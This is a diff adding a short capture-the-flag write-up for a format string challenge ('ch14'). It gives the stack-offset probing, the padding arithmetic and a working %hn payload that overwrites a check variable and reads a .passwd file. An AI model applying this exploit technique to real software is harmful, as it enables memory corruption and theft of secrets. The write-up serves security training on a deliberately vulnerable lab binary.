@@ -1,0 +1,31 @@
+===============================================================================
+Use "AAAA" at the beginning of the input to easily identify fmt as 41414141
+- Use as many hexadecimal conversion specifiers as necessary to find fmt
+- The block below indicates that fmt is 9 stack elements away
+$ ./ch14 "AAAA %x %x %x %x %x %x %x %x %x %x"                                                                            
+check at 0xbffffbc8
+argv[1] = [AAAA %x %x %x %x %x %x %x %x {{%x}} %x]
+fmt=[AAAA b7fff918 0 0 0 bffffcf4 bffffc0e bffffc0f 4030201 {{41414141}} 66376220]
+check=0x4030201
+
+Write 0xdeadbeef to check and read the contents of .passwd
+
+- Append the address of the least significant nibble of check, 0xbffffbc8, to fmt
+- Append the address of the most significant nibble of check: 0xbffffbca, to fmt
+- Subtract the length of both addresses (8 bytes) from 0xbeef to calculate the number of additional output bytes required to write 0xbeef to 0xbffffbc8
+- Subtract 0xbeef from 0xdead to calculate the number of output bytes needed to write 0xdead to 0xbffffbca
+- Reference the addresses of the least and most signficant nibbles of check by ’9$’ and ’10$’ respectively.
+$ echo $((0xbeef - 8)) $((0xdead - 0xbeef))
+48871 8126
+$  echo "cat .passwd" | ./ch14 "`printf '\xc8\xfb\xff\xbf\xca\xfb\xff\xbf%s%s' '%48871x%9$hn' '%8126x%10$hn'`"            
+check at 0xbffffbc8
+argv[1] = [����%48871x%9$hn%8126x%10$hn]
+fmt=[����                                                                                                                       ]
+check=0xdeadbeef
+Yeah dude ! You win !
+===============================================================================
+
+
+===============================================================================
+
+===============================================================================
